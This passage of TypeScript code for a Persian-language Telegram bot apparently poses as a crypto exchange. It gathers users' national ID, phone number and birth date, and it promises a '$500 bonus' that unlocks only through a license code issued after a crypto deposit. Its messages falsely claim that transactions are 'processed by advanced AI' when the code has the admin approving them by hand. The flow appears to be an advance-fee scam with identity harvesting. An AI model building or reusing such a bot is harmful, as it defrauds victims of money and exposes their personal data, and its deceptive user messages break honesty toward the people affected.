    const text = (msg.text ?? "").trim();

    // ── وضعیت‌های ادمین ──────────────────────────────────────────────────────
    if (userId === ADMIN_ID) {
      const aState = getAdminState(ADMIN_ID);
      if (aState) {
        setAdminState(ADMIN_ID, undefined);

        if (aState === "search_user") {
          const tid = Number(text);
          if (isNaN(tid)) { await safeSend(chatId, "❌ آیدی نامعتبر است."); return; }
          const u = getUser(tid);
          if (!u) { await safeSend(chatId, `❌ کاربری با آیدی ${tid} یافت نشد.`); return; }
          await safeSend(chatId,
            `🔍 اطلاعات کاربر ${tid}\n👤 ${u.firstName ?? "-"} | @${u.username ?? "-"}\n📅 ثبت: ${u.registeredAt}\n💳 واریز: ${u.deposited ? "✅" : "❌"}\n🎁 جایزه: ${u.bonusActivated ? "✅" : "❌"}\n✅ برداشت: ${u.withdrawalCompleted ? "✅" : "❌"}\n🔐 کد لایسنس: ${u.licenseCode ?? "ندارد"}\n🔗 معرفی‌ها: ${u.referrals?.length ?? 0} نفر (واریز موفق: ${u.referralDeposits ?? 0})\n📌 معرف: ${u.referredBy ?? "ندارد"}`,
            { reply_markup: adminBackKb });
          return;
        }

        if (aState === "manual_deposit") {
          const tid = Number(text);
          if (isNaN(tid)) { await safeSend(chatId, "❌ آیدی نامعتبر است."); return; }
          const u = getUser(tid);
          if (!u) { await safeSend(chatId, `❌ کاربری با آیدی ${tid} یافت نشد.`); return; }
          if (u.deposited) { await safeSend(chatId, `⚠️ قبلاً تأیید شده. لایسنس: ${u.licenseCode ?? "-"}`); return; }
          const code = generateLicenseCode();
          updateUser(tid, { deposited: true, licenseCode: code });
          if (u.referredBy) {
            recordReferralDeposit(u.referredBy);
            try { await bot.sendMessage(u.referredBy, `🎉 دوست شما «${u.firstName ?? u.userId}» واریز موفق انجام داد!\n💰 ۲۵٪ پاداش به حساب صراف شما اضافه خواهد شد.`); } catch { }
          }
          await safeSend(tid,
            `✅ تبریک! واریز شما با موفقیت تأیید شد.\n\n🎁 کد لایسنس شخصی شما:\n<code>${esc(code)}</code>\n\n📌 نکات مهم:\nبا این کد لایسنس می‌توانید جایزه ۵۰۰ دلاری خود را فعال نموده و در بخش برداشت نیز از آن استفاده نمایید.`,
            { ...HTML, reply_markup: backKb });
          await safeSend(chatId, `✅ واریز ${tid} تأیید شد.\n🔐 لایسنس: <code>${esc(code)}</code>`, { ...HTML, reply_markup: adminBackKb });
          return;
        }

        // FIX: پاسخ به کاربر مشخص — مرحله اول (دریافت آیدی)
        if (aState === "reply_user_id") {
          const tid = Number(text);
          if (isNaN(tid)) { await safeSend(chatId, "❌ آیدی نامعتبر است."); return; }
          const u = getUser(tid);
          if (!u) { await safeSend(chatId, `❌ کاربری با آیدی ${tid} یافت نشد.`); return; }
          // ذخیره آیدی هدف در adminState
          setAdminState(ADMIN_ID, `reply_msg_${tid}`);
          await safeSend(chatId,
            `✉️ پاسخ به کاربر: ${u.firstName ?? "-"} (@${u.username ?? "-"})\n\nاکنون پیام خود را بنویسید:`);
          return;
        }

        // FIX: پاسخ به کاربر مشخص — مرحله دوم (ارسال پیام)
        if (aState?.startsWith("reply_msg_")) {
          const tid = Number(aState.replace("reply_msg_", ""));
          if (!text) { await safeSend(chatId, "❌ پیام خالی است."); return; }
          try {
            await bot.sendMessage(tid, `💬 پیام از پشتیبانی صراف:\n\n${text}`);
            await safeSend(chatId, `✅ پیام با موفقیت به کاربر ${tid} ارسال شد.`, { reply_markup: adminBackKb });
          } catch {
            await safeSend(chatId, `❌ ارسال پیام به کاربر ${tid} ناموفق بود. احتمالاً ربات را بلاک کرده.`, { reply_markup: adminBackKb });
          }
          return;
        }

        if (aState === "delete_user") {
          const tid = Number(text);
          if (isNaN(tid)) { await safeSend(chatId, "❌ آیدی نامعتبر است."); return; }
          const u = getUser(tid);
          if (!u) { await safeSend(chatId, `❌ کاربری با آیدی ${tid} یافت نشد.`); return; }
          await safeSend(chatId,
            `⚠️ آیا از حذف کاربر زیر مطمئن هستید؟\n\n👤 ${u.firstName ?? "-"} (@${u.username ?? "-"})\n🔢 آیدی: ${tid}`,
            {
              reply_markup: {
                inline_keyboard: [
                  [{ text: "❌ انصراف", callback_data: "admin_back_panel" }],
                  [{ text: "🗑️ بله، حذف شود", callback_data: `admin_confirm_delete_${tid}` }],
                ],
              },
            });
          return;
        }

        if (aState === "broadcast") {
          if (!text) { await safeSend(chatId, "❌ متن پیام خالی است."); return; }
          const users = getAllUsers();
          let sent = 0, failed = 0;
          for (const u of users) {
            if (u.userId === ADMIN_ID) continue;
            try {
              await bot.sendMessage(u.userId, `📢 پیام از مدیریت صراف:\n\n${text}`);
              sent++;
              await new Promise(r => setTimeout(r, 50));
            } catch { failed++; }
          }
          await safeSend(chatId, `📢 پیام همگانی ارسال شد.\n✅ موفق: ${sent} | ❌ ناموفق: ${failed}`, { reply_markup: adminBackKb });
          return;
        }
        return;
      }
    }

    // ── KYC مرحله ۱: کد ملی ──────────────────────────────────────────────────
    if (state === "kyc_step1") {
      if (!isValidNationalId(text)) {
        await safeSend(chatId, `❌ کد ملی باید دقیقاً ۱۰ رقم باشد. لطفاً مجدداً وارد کنید:`);
        return;
      }
      updateUser(userId, { nationalId: text });
      setUserState(userId, "kyc_step2");
      await safeSend(chatId, `🛡️ بخش احراز هویت | مرحله دوم\n\nلطفاً شماره تلفن همراه خود را وارد کنید:`);
      return;
    }

    // ── KYC مرحله ۲: شماره موبایل ────────────────────────────────────────────
    if (state === "kyc_step2") {
      if (!isValidPhone(text)) {
        await safeSend(chatId, `❌ شماره موبایل معتبر نیست. مثال: 09123456789\nلطفاً مجدداً وارد کنید:`);
        return;
      }
      updateUser(userId, { phone: text });
      setUserState(userId, "kyc_step3");
      await safeSend(chatId, `🛡️ بخش احراز هویت | مرحله نهایی\n\nلطفاً تاریخ تولد خود را به صورت شمسی (روز/ماه/سال) وارد نمایید:`);
      return;
    }

    // ── KYC مرحله ۳: تاریخ تولد ─────────────────────────────────────────────
    if (state === "kyc_step3") {
      if (!isValidBirthDate(text)) {
        await safeSend(chatId, `❌ فرمت تاریخ اشتباه است. مثال: 15/6/1370\nلطفاً مجدداً وارد کنید:`);
        return;
      }
      updateUser(userId, { birthDate: text });
      setUserState(userId, "kyc_license");
      await safeSend(chatId, `✅ احراز هویت با موفقیت تکمیل شد.\n\n🎁 جهت فعال‌سازی جایزه ۵۰۰ دلاری، لطفاً کد لایسنس شخصی خود را وارد نمایید:`);
      return;
    }

    // ── KYC مرحله نهایی: کد لایسنس ──────────────────────────────────────────
    if (state === "kyc_license") {
      const fresh = getUser(userId)!;
      if (fresh.bonusActivated) {
        setUserState(userId, "idle");
        await safeSend(chatId, `✅ جایزه شما قبلاً فعال شده است.\n💰 برای برداشت به «برداشت ➖» بروید.`, { reply_markup: backKb });
        return;
      }
      if (!fresh.licenseCode) {
        setUserState(userId, "idle");
        await safeSend(chatId, `⚠️ ابتدا باید واریز انجام داده و کد لایسنس دریافت نمایید.`, { reply_markup: backKb });
        return;
      }
      if (text === fresh.licenseCode) {
        setUserState(userId, "idle");
        updateUser(userId, { bonusActivated: true });
        await safeSend(chatId,
          `✅ کد لایسنس صحیح می‌باشد.\n\n🎊 تبریک! جایزه ۵۰۰ دلاری با موفقیت برای شما فعال گردید.\n\nاکنون می‌توانید بلافاصله نسبت به برداشت آن اقدام نمایید. 💰`,
          { reply_markup: backKb });
      } else {
        await safeSend(chatId,
          `❌ کد لایسنس وارد شده معتبر نمی‌باشد.\n\n🎁 جهت دریافت جایزه ۵۰۰ دلاری، لطفاً کد لایسنس صحیح را مجدداً ارسال نمایید.`);
      }
      return;
    }

    // ── رسید واریز ───────────────────────────────────────────────────────────
    if (state.startsWith("deposit_receipt_")) {
      const coin = state.replace("deposit_receipt_", "");
      setUserState(userId, "idle");
      await safeSend(chatId,
        `⏳ درخواست واریز شما در حال پردازش توسط هوش مصنوعی پیشرفته سیستم می‌باشد.\n\nلطفاً شکیبا باشید. در صورت بروز هرگونه مشکل، با پشتیبانی سایت تماس بگیرید.\n\n⚠️ نکته:\nاگر واریزی انجام نشده باشد، پاسخی از سوی سیستم دریافت نخواهید کرد.\n\n⏱ زمان پردازش:\nحداقل ۱۰ دقیقه و حداکثر ۲۴ ساعت.`,
        { reply_markup: backKb });

      const refInfo = user.referredBy ? `\n🔗 معرف: ${user.referredBy}` : "";
      const adminMsg = `📬 ادمین گرامی، درخواست واریز جدید دریافت شد.\n\n👤 آیدی کاربر: @${user.username ?? userId}\n🔢 آیدی عددی کاربر: ${userId}\n🪙 ارز: ${COIN_LABELS[coin] ?? coin}${refInfo}\n\n📎 لطفاً تصویر و شناسه تراکنش را بررسی نموده و در صورت صحت، تراکنش را تأیید نمایید.`;
      const adminKb = {
        reply_markup: {
          inline_keyboard: [
            [{ text: "♦️ تراکنش ناموفق ♦️", callback_data: `admin_reject_deposit_${userId}` }],
            [{ text: "🟢 تراکنش موفق 🟢", callback_data: `admin_approve_deposit_${userId}` }],
          ],
        },
      };
      if (msg.photo) {
        await notifyAdminPhoto(msg.photo[msg.photo.length - 1]!.file_id, adminMsg, { reply_markup: adminKb.reply_markup });
      } else {
        await notifyAdmin(adminMsg + (text ? `\n\n📝 هش/متن تراکنش: ${text}` : ""), adminKb);
      }
      return;
    }

    // ── کد لایسنس برداشت ─────────────────────────────────────────────────────
    if (state === "withdraw_license_entry") {
      const fresh = getUser(userId)!;
      if (!fresh.bonusActivated) {
        setUserState(userId, "idle");
        await safeSend(chatId, `⚠️ برای برداشت، ابتدا باید جایزه را از بخش «🎁 دریافت جایزه» فعال نمایید.`, { reply_markup: backKb });
        return;
      }
      if (fresh.withdrawalCompleted) {
        setUserState(userId, "idle");
        await safeSend(chatId, `⚠️ برداشت شما قبلاً انجام شده است.`, { reply_markup: backKb });
        return;
      }
      if (fresh.licenseCode && text === fresh.licenseCode) {
        setUserState(userId, "idle");
        await safeSend(chatId,
          `✅ کد لایسنس صحیح است.\n\nلطفاً روش برداشت مورد نظر خود را انتخاب کنید:`,
          {
            reply_markup: {
              inline_keyboard: [
                [{ text: "🎁 برداشت به صورت کد هدیه 🎁", callback_data: "wd_gift_menu" }],
                [{ text: "⚜️ برداشت با ارز دیجیتال ⚜️", callback_data: "wd_crypto_menu" }],
              ],
            },
          });
      } else {
        await safeSend(chatId,
          `❌ کد لایسنس وارد شده معتبر نمی‌باشد.\n\nلطفاً کد لایسنس صحیح خود را مجدداً وارد نمایید:`);
      }
      return;
    }

    // ── آدرس برداشت ──────────────────────────────────────────────────────────
    if (state.startsWith("withdraw_address_")) {
      const coin = state.replace("withdraw_address_", "");
      setUserState(userId, "idle");
      await safeSend(chatId,
        `⏳ درخواست برداشت شما در حال پردازش توسط هوش مصنوعی پیشرفته سیستم می‌باشد.\n\nلطفاً شکیبا باشید. در صورت بروز مشکل، با پشتیبانی سایت تماس بگیرید.\n\n⏱ زمان پردازش: ۱۰ دقیقه تا ۲۴ ساعت.`,
        { reply_markup: backKb });
      await notifyAdmin(
        `📬 ادمین گرامی، درخواست برداشت جدید دریافت شد.\n\n👤 آیدی کاربر: @${user.username ?? userId}\n🔢 آیدی عددی کاربر: ${userId}\n📍 آدرس ارسالی کاربر: ${text}\n🪙 ارز انتخابی: ${COIN_LABELS[coin] ?? coin}\n\n✅ لطفاً پس از واریز ۶۰۰ دلار به آدرس فوق، تراکنش را تأیید نمایید.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "☑️ تأیید برداشت کاربر ☑️", callback_data: `admin_approve_withdraw_${userId}_COIN_${coin}` }],
            ],
          },
        });
      return;
    }

    // ── FIX: پشتیبانی — پیام کاربر به ادمین می‌رسد ──────────────────────────
    if (state === "support_chat") {
      // state را idle نمی‌کنیم تا کاربر بتواند چند پیام بفرستد
      const supportMsg = `💬 پیام پشتیبانی از کاربر\n\n👤 آیدی: @${user.username ?? userId}\n🔢 آیدی عددی: ${userId}\n👤 نام: ${user.firstName ?? "-"}\n\n📝 پیام:\n${text || "(تصویر/فایل)"}`;
      const replyKb = {
        reply_markup: {
          inline_keyboard: [
            [{ text: "✉️ پاسخ به این کاربر", callback_data: "admin_reply_user" }],
          ],
        },
      };
      if (msg.photo) {
        await notifyAdminPhoto(msg.photo[msg.photo.length - 1]!.file_id, supportMsg, { reply_markup: replyKb.reply_markup });
      } else {
        await notifyAdmin(supportMsg, replyKb);
      }
      await safeSend(chatId,
        `✅ پیام شما به تیم پشتیبانی ارسال شد.\nبه زودی پاسخ دریافت خواهید کرد. 🙏`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "📨 ارسال پیام دیگر", callback_data: "support" }],
              [{ text: "↩️ بازگشت به منوی اصلی ↪️", callback_data: "main_menu" }],
            ],
          },
        });
      return;
    }

    // ── خارج از محدوده ────────────────────────────────────────────────────────
    if (state === "idle") {
      await safeSend(chatId, "♦️ خارج از محدوده مشخص شده ♦️");
    }

  } catch (e) { logger.error({ e }, "message handler error"); }
});

bot.on("polling_error", (error) => { logger.error({ error }, "Telegram polling error"); });

logger.info("Telegram bot started");
export default bot;
